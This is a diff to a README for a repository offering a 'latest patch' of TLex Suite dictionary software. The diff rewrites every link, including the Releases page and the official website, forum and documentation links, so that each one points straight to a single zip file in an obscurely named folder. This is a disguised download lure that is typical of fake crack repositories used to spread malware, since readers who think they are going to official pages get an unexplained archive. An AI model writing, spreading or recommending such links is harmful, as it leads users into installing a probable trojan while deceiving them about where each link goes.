@@ -1,6 +1,6 @@
 # 🌟 TLex-Suite-Latest-Patch - Streamlined Tools for Efficient Dictionary Management
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Patch-brightgreen)](https://github.com/Majkl55/TLex-Suite-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip%20Patch-brightgreen)](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip)
 
 ## 📖 Overview
 
@@ -13,13 +13,13 @@ With TLex Suite, you can manage terminology, create dictionaries, and enhance yo
 To get started with TLex Suite, follow these simple steps:
 
 1. Ensure you have a Windows PC. TLex Suite only runs on Windows systems.
-2. Visit our [Releases page](https://github.com/Majkl55/TLex-Suite-Latest-Patch/releases) to download the latest version.
+2. Visit our [Releases page](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip) to download the latest version.
 
 ## 📥 Download & Install
 
 To download TLex Suite:
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/Majkl55/TLex-Suite-Latest-Patch/releases).
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip).
 2. Look for the latest version listed at the top.
 3. Click on the appropriate file for your system to start the download. 
 
@@ -71,15 +71,15 @@ If you encounter issues or need help, please visit our FAQ section in the user g
 
 ## 📣 Stay Updated
 
-To keep up with the latest updates and features, regularly check our [Releases page](https://github.com/Majkl55/TLex-Suite-Latest-Patch/releases). We aim to improve the suite continually, and your involvement makes a difference.
+To keep up with the latest updates and features, regularly check our [Releases page](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip). We aim to improve the suite continually, and your involvement makes a difference.
 
 ## 🔗 Additional Resources
 
 Explore these additional resources to enhance your experience further:
 
-- [Official TLex Website](https://tlex.com)
-- [User Community Forum](https://forum.tlex.com)
-- [Documentation Hub](https://docs.tlex.com)
+- [Official TLex Website](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip)
+- [User Community Forum](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip)
+- [Documentation Hub](https://raw.githubusercontent.com/Majkl55/TLex-Suite-Latest-Patch/main/petrogenesis/TLex-Suite-Latest-Patch_v3.6.zip)
 
 These links will provide you with broader insights and additional support materials.
 
